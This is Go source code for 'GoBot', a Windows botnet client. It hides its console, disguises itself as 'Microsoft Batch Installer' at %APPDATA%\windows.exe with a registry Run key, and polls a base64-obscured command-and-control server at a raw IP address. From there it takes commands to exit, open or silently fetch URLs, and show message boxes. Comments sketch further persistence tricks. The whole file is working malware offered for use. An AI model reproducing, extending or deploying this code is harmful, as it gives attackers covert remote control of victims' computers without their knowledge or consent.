
//Compile with   go build -o GoBot.exe -ldflags "-H windowsgui" "C:\gobot.go"    to have no console show.
// By SaturnsVoid

//https://github.com/luisiturrios/gowin
//code.google.com/p/winsvc/winapi
//https://www.socketloop.com/tutorials/
//https://mmcgrana.github.io/2012/09/go-by-example-timers-and-tickers.html

//persistance?
// hydra (multiplit and add to registry at new location, more then one will start but SingleInstance will make sure that only one runs at a time)
// Hidden VBS script to run in the BG (make sure the files still in registry? Bot and VBS make sure each other are running?
// Multi-Channel?

//Anti-Botnet
// Scans Statup Registry and remove potential threats? (how to detect threats?)

package main

import (
	"bytes"
    "fmt"
	"os/user"
    "io/ioutil"
    "net/http"
	"syscall"
    "unsafe"
	"io"
	"encoding/base64"
	"os"
	"github.com/luisiturrios/gowin"
	"crypto/md5"
    "encoding/hex"
	"strings"
	"os/exec"
	"time"
)

var(

//==========================================================Edit
Panel string = "aHR0cDovLzEwNC4yMjMuMTI1LjEzNy8=" //Control Panel URL(Base64 Encoded)
ReconnectTime int = 5 //Minutes
SingleInstance bool = true //True = Only one can run, False = Mutliple can run at once
InstanceKey string = "0f7b0fcd-d67c-43d8-b7e5-76f95da01665" //Key to detect for Single Instance http://www.guidgen.com/
Install bool = false // True = Install, False = No Install
InstallName string = "Microsoft Batch Installer"
InstallPath string = os.Getenv("APPDATA") + "\\windows.exe" //Where the bot will install C:\Users\SaturnsVoid\AppData\Roaming
InstallHKEY string = "%APPDATA%" + "\\windows.exe" //Registry Key for where the bot will install 

//==========================================================End Edit

//MyFile string
LastCMD string

modkernel32 = syscall.NewLazyDLL("kernel32.dll")
procCreateMailslot = modkernel32.NewProc("CreateMailslotW")

kernel32, _        = syscall.LoadLibrary("kernel32.dll")
getModuleHandle, _ = syscall.GetProcAddress(kernel32, "GetModuleHandleW")
user32, _     = syscall.LoadLibrary("user32.dll")
messageBox, _ = syscall.GetProcAddress(user32, "MessageBoxW")
)

const (
    MB_OK                = 0x00000000
    MB_OKCANCEL          = 0x00000001
    MB_ABORTRETRYIGNORE  = 0x00000002
    MB_YESNOCANCEL       = 0x00000003
    MB_YESNO             = 0x00000004
    MB_RETRYCANCEL       = 0x00000005
    MB_CANCELTRYCONTINUE = 0x00000006
    MB_ICONHAND          = 0x00000010
    MB_ICONQUESTION      = 0x00000020
    MB_ICONEXCLAMATION   = 0x00000030
    MB_ICONASTERISK      = 0x00000040
    MB_USERICON          = 0x00000080
    MB_ICONWARNING       = MB_ICONEXCLAMATION
    MB_ICONERROR         = MB_ICONHAND
    MB_ICONINFORMATION   = MB_ICONASTERISK
    MB_ICONSTOP          = MB_ICONHAND
    MB_DEFBUTTON1 = 0x00000000
    MB_DEFBUTTON2 = 0x00000100
    MB_DEFBUTTON3 = 0x00000200
    MB_DEFBUTTON4 = 0x00000300
)

//-------------------------Main Function---------------------------------------------

func main() {
	//args := os.Args
	//if len(args) > 1{
	//	fmt.Println("Test")
	//}
	//Check for args, handle args.
	//MyFile := os.Args[0]

	
	if SingleInstance != false{
	  err := singleInstance(InstanceKey)
		if err != nil {
			//os.Exit(0)
		}
	}
	if Install != false{
		meInstall()
	}
	  //check internet bofore? on loop?
	
	for {
		 time.Sleep(time.Minute * ReconnectTime)
		httpGETCommands()
	}
	
}

//------------------------------HTTP Worker---------------------------------------- 
//http://golang.org/pkg/net/http/

//cmd, err := httpWorker("intro&data=")
//	if err != nil {
//		panic(err)
//	}
//	fmt.Println("Latest Command:", cmd)
//}
//  intro&data=

//Panel adds UID to database if it does not exist

func httpGETCommands(){
	if checkInternet(){ // Check for panel connection	
		rsp, err := http.Get(base64Decode(Panel)+ "cmd.php?get=" + getUID())
    	if err != nil {
        	//return ""
    	}
    	defer rsp.Body.Close()
    	buf, err := ioutil.ReadAll(rsp.Body)
    	if err != nil {
        	//return ""
    	}	
		data := base64Decode(string(bytes.TrimSpace(buf)))	
		if data != LastCMD{
			tmp := strings.Split(data, "|")
			if tmp[0] == "ALL" || tmp[0] == getUID(){		 //ALL or just me
				if tmp[1] == "0"{ //DIE
					os.Exit(0)				
				}else if tmp[1] == "1"{ //cmdHandler("ALL|1|http://www.google.com|V")
					if tmp[3] == "V"{ //Visable
						if strings.Contains(tmp[2], "http://"){
							exec.Command("cmd", "/c", "start", tmp[2]).Start()
							LastCMD = data					
						}
					}else if tmp[3] == "H"{//Hidden
						if strings.Contains(tmp[2], "http://"){
							rsp, err := http.Get(tmp[2])
								if err != nil {						
								}
								defer rsp.Body.Close()
								LastCMD = data							
						}
					}
				}else if tmp[1] == "2"{ //Show message box //cmdHandler("ALL|2|Title|Message")
					MessageBox(tmp[2], tmp[3], MB_OK)
					LastCMD = data				
				}else if tmp[1] == "3"{
								
				}else if tmp[1] == "4"{
				
				}
			}		
		}	
	}
}
//-------------------------Check Internet--------------------------------------------
func checkInternet() (bool) { //Connect to cmd.php and see if it replys with just "ok" to check connection
    rsp, err := http.Get(base64Decode(Panel)+ "cmd.php?test")
    if err != nil {
        return false//bad connection
    }
    defer rsp.Body.Close()
    buf, err := ioutil.ReadAll(rsp.Body)
    if err != nil {
        return false//bad connection
    }
	if string(bytes.TrimSpace(buf))!= "ok"{
		return false //bad connection
	}else{
		return true //connection ok
	}   
}
//-------------------------------MessageBox----------------------------------- 

//	https://github.com/golang/go/wiki/WindowsDLLs

//	defer syscall.FreeLibrary(kernel32)//For MessageBox
//	defer syscall.FreeLibrary(user32)//For MessageBox

//	MessageBox("Title", "Message", MB_OK) //Just shows messagebox
//	fmt.Printf("Return: %v\n", MessageBox("Title", "Message", MB_YESNO)) // Returns the answer (6 = Yes, 7 = No)

func abort(funcname string, err error) {
    panic(fmt.Sprintf("%s failed: %v", funcname, err))
}

func MessageBox(caption, text string, style uintptr) (result int) {
    var nargs uintptr = 4
    ret, _, callErr := syscall.Syscall9(uintptr(messageBox),
        nargs,
        0,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(text))),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),
        style,
        0,
        0,
        0,
        0,
        0)
    if callErr != 0 {
        abort("Call MessageBox", callErr)
    }
    result = int(ret)
    return
}

func GetModuleHandle() (handle uintptr) {
    var nargs uintptr = 0
    if ret, _, callErr := syscall.Syscall(uintptr(getModuleHandle), nargs, 0, 0, 0); callErr != 0 {
        abort("Call GetModuleHandle", callErr)
    } else {
        handle = ret
    }
    return
}
//------------------Single Instance------------------------------------

func singleInstance(name string) error {
    ret, _, _ := procCreateMailslot.Call(
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`\\.\mailslot\`+name))),
        0,
        0,
        0,
    )
    // If the function fails, the return value is INVALID_HANDLE_VALUE.
    if int64(ret) == -1 {
        os.Exit(0)
    }
    return nil
}
//------------------Information Get------------------------------------
	
func getUsername() string{
	usr, _:= user.Current()
	return usr.Username
}

func getOS()string{
	val, _:= gowin.GetReg("HKLM", `Software\Microsoft\Windows NT\CurrentVersion`, "ProductName")
    return val
}

func getWInstalDate()string{
	val, _:= gowin.GetReg("HKLM", `Software\Microsoft\Windows NT\CurrentVersion`, "InstallDate")
    return val
}

func getUID() string{ //Make more Uniqe for computer...
	return getMD5Hash("GoBot$" + getUsername() + getOS() + getWInstalDate()+ "$toBoG")
}
//------------------Install & Uninstall-----------------------
	
func meInstall(){
	MyFile := os.Args[0]
	err := CopyFile(MyFile, InstallPath)
	if err != nil {
	}
	err = gowin.WriteStringReg("HKCU",`Software\Microsoft\Windows\CurrentVersion\Run`,InstallName,InstallHKEY)
    if err != nil {
    }	
} 

func meUninstall(){
	err := gowin.DeleteKey("HKCU",`Software\Microsoft\Windows\CurrentVersion\Run`,InstallName)
    if err != nil {
    }
} 

//------------------Crypto------------------------------------

func base64Encode(str string) string {
    return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
    data, err := base64.StdEncoding.DecodeString(str)
    if err != nil {
        return ""
    }
    return string(data)
}

func getMD5Hash(text string) string {
    hasher := md5.New()
    hasher.Write([]byte(text))
    return hex.EncodeToString(hasher.Sum(nil))
}

//--------------------File Worker-------------------------
 func CopyFile(source string, dest string) (err error) {
     sourcefile, err := os.Open(source)
     if err != nil {
         return err
     }
     defer sourcefile.Close()
     destfile, err := os.Create(dest)
     if err != nil {
         return err
     }
     defer destfile.Close()
     _, err = io.Copy(destfile, sourcefile)
     if err == nil {
         sourceinfo, err := os.Stat(source)
         if err != nil {
             err = os.Chmod(dest, sourceinfo.Mode())
         }
     }
     return
 }
